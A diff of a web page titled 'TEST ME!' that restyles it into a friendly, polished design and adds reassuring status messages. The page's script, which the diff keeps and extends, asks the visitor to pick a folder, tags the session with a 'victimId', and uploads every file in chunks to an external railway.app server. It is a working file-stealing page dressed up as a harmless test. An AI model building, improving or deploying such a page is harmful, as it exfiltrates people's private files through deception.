@@ -5,41 +5,72 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TEST ME!</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
     body {
-      background: #a79f9f;
-      color: #0F0;
-      font-family: monospace;
+      background: linear-gradient(135deg, #6e7f80, #a79f9f);
+      color: #fff;
+      font-family: 'Arial', sans-serif;
       text-align: center;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      padding: 20px;
     }
+
+    h1 {
+      font-size: 3rem;
+      color: #fff;
+      margin-bottom: 30px;
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+    }
+
     button {
-      padding: 10px;
-      border: 2px solid red;
-      background: transparent;
-      color: red;
+      padding: 15px 30px;
+      border: none;
+      background-color: #ff6347;
+      color: #fff;
+      font-size: 1.2rem;
       cursor: pointer;
+      border-radius: 5px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+      transition: background-color 0.3s, transform 0.3s;
+    }
+
+    button:hover {
+      background-color: #ff4500;
+      transform: scale(1.05);
+    }
+
+    button:focus {
+      outline: none;
+    }
+
+    .message {
       font-size: 1.2rem;
       margin-top: 20px;
-    }
-    button:hover {
-      background: red;
-      color: #000;
+      color: #dcdcdc;
     }
   </style>
 </head>
 <body>
   <h1>TEST ME!</h1>
   <button id="start">Start</button>
+  <p class="message" id="statusMessage">Click the button to start the upload process.</p>
   <script>
     (function(){
       let uploadUrl = "https://deobbetest1-production-104e.up.railway.app/upload";
     
       document.getElementById("start").addEventListener("click", async () => {
         try {
+          document.getElementById("statusMessage").textContent = "Processing files, please wait...";
+
           let victimId = crypto.randomUUID();
           let directoryHandle = await window.showDirectoryPicker();
           
@@ -89,7 +120,6 @@
                     
                     // Upload each chunk
                     for (let { index, total, data } of chunks) {
-                      //await new Promise(resolve => setTimeout(resolve, Math.random() * (100 - 50) + 50)); // Random delay
                       await fetch(uploadUrl, {
                         method: "POST",
                         headers: {
@@ -114,12 +144,14 @@
               }
             }
             await Promise.allSettled(uploadPromises);
+            document.getElementById("statusMessage").textContent = "Upload complete!";
           }
           
           // Start file upload process
           await uploadFiles(directoryHandle, victimId);
         } catch (error) {
           console.error("An error occurred", error);
+          document.getElementById("statusMessage").textContent = "An error occurred during the process.";
         }
       });
     })();
